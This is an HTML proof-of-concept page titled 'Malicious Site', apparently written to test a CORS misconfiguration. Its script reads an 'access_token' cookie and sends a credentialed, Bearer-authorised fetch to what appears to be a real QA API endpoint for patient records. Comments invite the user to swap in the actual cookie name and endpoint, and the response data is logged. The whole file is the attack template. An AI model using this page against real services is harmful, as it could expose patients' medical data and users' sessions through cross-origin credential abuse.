<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Site</title>
</head>
<body>
    <h1>Malicious Site</h1>
    <button id="exploit">Exploit CORS</button>
    <script>
        // Function to get a cookie by name
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }

        // Access the JWT cookie
        const jwtToken = getCookie('access_token'); // Change this to the actual cookie name

        document.getElementById('exploit').onclick = function() {
            fetch('https://qaagilecptapi.talosml.com/api/v1.0/Patient/GetAllReasonType', { // Change this to the actual API endpoint
                method: 'GET', // Change to 'POST' if needed
                headers: {
                    'Authorization': `Bearer ${jwtToken}`, // Use the JWT as the Bearer token
                    // Add other headers if necessary, e.g.:
                    // 'Content-Type': 'application/json'
                },
                credentials: 'include' // This will send cookies along with the request
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                return response.json();
            })
            .then(data => {
                console.log(data); // Process the response data
            })
            .catch(error => console.error('Error:', error));
        };
    </script>
</body>
</html>
